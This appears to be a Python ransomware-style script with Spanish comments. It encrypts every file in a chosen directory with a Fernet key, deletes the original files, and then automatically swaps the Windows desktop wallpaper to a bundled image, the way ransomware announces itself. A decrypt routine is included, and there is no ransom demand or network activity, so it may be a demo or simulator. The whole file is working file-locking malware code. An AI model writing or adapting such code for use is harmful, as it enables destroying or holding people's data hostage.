from cryptography.fernet import Fernet
import os
import ctypes

def generate_key():
    """Genera y guarda una clave en un archivo."""
    try:
        key = Fernet.generate_key()
        with open("secret.key", "wb") as key_file:
            key_file.write(key)
        print("✅ Clave secreta generada y guardada en 'secret.key'.")
    except Exception as e:
        print(f"❌ Error al generar la clave: {e}")

def load_key():
    """Carga la clave desde el archivo."""
    try:
        return open("secret.key", "rb").read()
    except FileNotFoundError:
        print("❌ No se encontró 'secret.key'. Genera una clave primero.")
        return None

def encrypt_file(file_path, fernet):
    """Cifra el contenido de un archivo y elimina el original."""
    try:
        with open(file_path, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        encrypted_file_path = file_path + ".encrypted"
        with open(encrypted_file_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted)

        print(f"✅ Archivo cifrado: {encrypted_file_path}")

        # Elimina el archivo original
        os.remove(file_path)
        print(f"🗑️ Archivo original eliminado: {file_path}")

    except Exception as e:
        print(f"❌ Error al cifrar {file_path}: {e}")

def encrypt_files_in_directory(directory):
    """Cifra todos los archivos en el directorio que no están cifrados y elimina los originales."""
    key = load_key()
    if not key:
        return

    fernet = Fernet(key)

    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)

        if os.path.isfile(file_path):
            if not filename.endswith('.encrypted'):
                encrypt_file(file_path, fernet)

def decrypt_file(encrypted_file_path, fernet):
    """Descifra el contenido de un archivo cifrado y elimina el archivo .encrypted."""
    try:
        with open(encrypted_file_path, "rb") as encrypted_file:
            encrypted = encrypted_file.read()

        decrypted = fernet.decrypt(encrypted)

        decrypted_file_path = encrypted_file_path.replace(".encrypted", "")
        with open(decrypted_file_path, "wb") as decrypted_file:
            decrypted_file.write(decrypted)

        print(f"✅ Archivo descifrado: {decrypted_file_path}")

        # Elimina el archivo cifrado
        os.remove(encrypted_file_path)
        print(f"🗑️ Archivo cifrado eliminado: {encrypted_file_path}")

    except Exception as e:
        print(f"❌ Error al descifrar {encrypted_file_path}: {e}")

def decrypt_files_in_directory(directory):
    """Descifra todos los archivos cifrados en el directorio y elimina los .encrypted."""
    key = load_key()
    if not key:
        return

    fernet = Fernet(key)

    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)

        if os.path.isfile(file_path):
            if filename.endswith('.encrypted'):
                decrypt_file(file_path, fernet)

def cambiar_fondo():
    """Cambia el fondo de pantalla en Windows usando wallpaper.jpg en el mismo directorio."""
    try:
        # Obtiene la ruta absoluta del programa (.py o .exe)
        base_path = os.path.dirname(os.path.abspath(__file__))
        ruta_imagen = os.path.join(base_path, "wallpaper.jpg")

        if not os.path.exists(ruta_imagen):
            print("❌ No se encontró 'wallpaper.jpg' en la carpeta del programa.")
            return

        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, ruta_imagen, 3)
        print(f"🖼️ Fondo de pantalla cambiado a: {ruta_imagen}")
    except Exception as e:
        print(f"❌ Error al cambiar el fondo de pantalla: {e}")

def main():
    action = input("¿Deseas (g)enerar una clave, (e)ncriptar o (d)esencriptar archivos? (g/e/d): ")

    if action.lower() == 'g':
        generate_key()
    elif action.lower() == 'e':
        directory = input("Introduce la ruta del directorio a cifrar: ")
        if os.path.isdir(directory):
            encrypt_files_in_directory(directory)
            print("🔒 Proceso de cifrado completado.")
            cambiar_fondo()  # 👈 Cambia el fondo automáticamente
        else:
            print("❌ La ruta no es un directorio válido.")
    elif action.lower() == 'd':
        directory = input("Introduce la ruta del directorio a descifrar: ")
        if os.path.isdir(directory):
            decrypt_files_in_directory(directory)
            print("🔓 Proceso de descifrado completado.")
        else:
            print("❌ La ruta no es un directorio válido.")
    else:
        print("❌ Opción no válida.")

if __name__ == "__main__":
    main()